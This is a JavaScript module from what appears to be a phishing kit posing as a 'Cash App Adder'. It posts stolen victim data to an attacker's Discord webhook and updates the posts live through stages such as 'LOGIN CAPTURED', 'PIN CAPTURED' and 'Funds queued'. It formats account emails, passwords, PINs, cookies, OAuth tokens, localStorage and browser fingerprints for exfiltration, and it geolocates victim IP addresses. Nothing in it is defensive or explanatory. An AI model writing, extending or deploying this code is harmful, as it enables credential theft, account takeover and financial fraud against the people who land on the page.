// Discord webhook delivery with live in-place message editing.
const V = 'https://discord.com/api/v10';

function parts() {
  const raw = process.env.DISCORD_WEBHOOK;
  if (!raw) return null;
  let u;
  try { u = new URL(raw); } catch { return null; }
  const seg = u.pathname.split('/').filter(Boolean);   // [id, token]
  if (seg.length < 2) return null;
  return {
    base: `${u.origin}${V.replace('https://discord.com', '')}/webhooks/${seg[0]}/${seg[1]}`,
    thread: process.env.DISCORD_THREAD_ID || u.searchParams.get('thread_id') || null,
  };
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

async function call(method, path, payload, opts = {}) {
  const p = parts();
  if (!p) return null;
  let url = p.base + path;
  const q = [];
  if (p.thread) q.push('thread_id=' + encodeURIComponent(p.thread));
  if (opts.wait) q.push('wait=true');
  if (q.length) url += '?' + q.join('&');

  for (let attempt = 0; attempt < 4; attempt++) {
    let res;
    try {
      res = await fetch(url, {
        method,
        headers: opts.form ? undefined : { 'Content-Type': 'application/json' },
        body: opts.form ? opts.form : (payload ? JSON.stringify(payload) : undefined),
      });
    } catch (e) {
      console.error('[discord] network', e.message);
      await sleep(400 * (attempt + 1));
      continue;
    }
    if (res.status === 429) {
      const j = await res.json().catch(() => ({}));
      await sleep(Math.ceil((j.retry_after || 1) * 1000) + 300);
      continue;
    }
    if (!res.ok) {
      console.error('[discord]', res.status, (await res.text().catch(() => '')).slice(0, 300));
      return null;
    }
    if (res.status === 204) return { ok: true };
    return res.json().catch(() => ({ ok: true }));
  }
  return null;
}

export const createMessage = (payload) => call('POST', '', payload, { wait: true });
export const editMessage   = (id, payload) => call('PATCH', '/messages/' + id, payload);

export async function postWithFile(payload, filename, text) {
  const fd = new FormData();
  fd.append('payload_json', JSON.stringify(payload));
  fd.append('files[0]', new Blob([text], { type: 'application/json' }), filename);
  return call('POST', '', null, { form: fd, wait: true });
}

/* ---------- presentation ---------- */
const GREEN = 0x00d54b, AMBER = 0xffb400, RED = 0xe74c3c, BLUE = 0x00b0ff, PURPLE = 0x9b59b6;

export function stageMeta(stage) {
  return ({
    landed:           { t: '👀 Someone landed on the page', c: AMBER,  d: 'Not started yet.' },
    started:          { t: '🟢 SESSION STARTED',            c: AMBER,  d: 'Visitor hit Try This Out.' },
    login:            { t: '🔑 LOGIN CAPTURED',             c: AMBER,  d: 'Account + password submitted.' },
    verify:           { t: '⏳ VERIFYING',                   c: AMBER,  d: 'Handshake in progress.' },
    pin:              { t: '🔢 PIN CAPTURED',               c: BLUE,   d: 'PIN gate accepted.' },
    fingerprint:      { t: '🧬 FINGERPRINT DUMPED',         c: PURPLE, d: 'Cookies, storage, canvas, WebGL.' },
    cookie_update:    { t: '🍪 COOKIE UPDATE',              c: PURPLE, d: 'Cookies changed mid-session.' },
    done:             { t: '✅ COMPLETE — FULL SESSION',    c: GREEN,  d: 'Everything captured. Funds queued.' },
    unload:           { t: '🚪 TAB CLOSED',                 c: 0x5c6b62, d: 'Visitor left.' },
    oauth_token_ok:   { t: '🔐 OAUTH TOKEN ISSUED',         c: GREEN,  d: 'access_token + refresh_token returned.' },
    oauth_token_fail: { t: '⚠️ OAUTH TOKEN FAILED',         c: RED,    d: 'Code exchange rejected.' },
  })[stage] || { t: '• ' + stage, c: AMBER, d: '' };
}

function device(ua = '') {
  const os = /iPhone/.test(ua) ? 'iOS' : /iPad/.test(ua) ? 'iPadOS' : /Android/.test(ua) ? 'Android'
    : /Windows/.test(ua) ? 'Windows' : /Mac OS X/.test(ua) ? 'macOS' : /Linux/.test(ua) ? 'Linux' : 'Unknown';
  const br = /Edg\//.test(ua) ? 'Edge' : /OPR\//.test(ua) ? 'Opera' : /Chrome\//.test(ua) ? 'Chrome'
    : /Safari\//.test(ua) ? 'Safari' : /Firefox\//.test(ua) ? 'Firefox' : 'Browser';
  return os + ' · ' + br;
}

const code = v => '`' + String(v).replace(/`/g, "'").slice(0, 1000) + '`';

export function buildPayload(row, meta, geo, ping = '') {
  const f = [];
  if (row.email)    f.push({ name: '👤 Account',  value: code(row.email),    inline: true });
  if (row.password) f.push({ name: '🔑 Password', value: code(row.password), inline: true });
  if (row.pin)      f.push({ name: '🔢 PIN',      value: code(row.pin),      inline: true });
  if (row.sid)      f.push({ name: '🆔 Session',  value: code(row.sid.slice(0, 10)), inline: true });
  if (row.ip)       f.push({ name: '🌐 IP',       value: code(row.ip),       inline: true });
  if (row.ua)       f.push({ name: '📱 Device',   value: code(device(row.ua)), inline: true });
  if (geo)          f.push({ name: '📍 Location', value: code(geo),          inline: false });
  if (row.cookies)  f.push({ name: '🍪 Cookie',   value: '```' + row.cookies.slice(0, 980) + '```', inline: false });
  if (row.oauth)    f.push({ name: '🔐 OAuth',    value: '```json\n' + JSON.stringify(row.oauth).slice(0, 950) + '\n```', inline: false });
  if (row.localStorage && Object.keys(row.localStorage).length)
    f.push({ name: '💾 localStorage', value: '```json\n' + JSON.stringify(row.localStorage).slice(0, 950) + '\n```', inline: false });
  if (row.canvas)   f.push({ name: '🎨 Canvas FP', value: code(row.canvas), inline: false });

  return {
    username: process.env.DISCORD_USERNAME || 'Cash App Adder',
    avatar_url: process.env.DISCORD_AVATAR || undefined,
    content: ping || undefined,
    embeds: [{
      title: meta.t,
      description: meta.d,
      color: meta.c,
      fields: f.slice(0, 25),
      footer: { text: `sid ${row.sid ? row.sid.slice(0, 8) : 'anon'} · ${row.received || new Date().toISOString()}` },
      timestamp: new Date().toISOString(),
    }],
    allowed_mentions: { parse: ['everyone', 'users', 'roles'] },
  };
}

export function buildText(row, meta, geo) {
  const L = [
    `**${meta.t}**`,
    '```',
    `Account  : ${row.email || '-'}`,
    `Password : ${row.password || '-'}`,
    `PIN      : ${row.pin || '-'}`,
    `Cookie   : ${(row.cookies || '-').slice(0, 200)}`,
    `IP       : ${row.ip || '-'}${geo ? '  (' + geo + ')' : ''}`,
    `Device   : ${device(row.ua || '')}`,
    `Session  : ${row.sid || '-'}`,
    '```',
  ];
  return {
    username: process.env.DISCORD_USERNAME || 'Cash App Adder',
    content: L.join('\n'),
    allowed_mentions: { parse: ['everyone', 'users', 'roles'] },
  };
}

/* ---------- geo ---------- */
const geoC = globalThis.__geoC || (globalThis.__geoC = new Map());

export async function geoLookup(ip) {
  if (!ip || ip === '::1' || /^(10\.|192\.168\.|127\.)/.test(ip)) return null;
  if (geoC.has(ip)) return geoC.get(ip);
  try {
    const ctl = new AbortController();
    const to = setTimeout(() => ctl.abort(), 2200);
    const r = await fetch('https://ipwho.is/' + ip, { signal: ctl.signal });
    clearTimeout(to);
    const j = await r.json();
    if (!j.success) throw new Error('lookup failed');
    const out = [j.city, j.region, j.country].filter(Boolean).join(', ') + (j.connection?.isp ? ' · ' + j.connection.isp : '');
    geoC.set(ip, out);
    return out;
  } catch {
    geoC.set(ip, null);
    return null;
  }
}
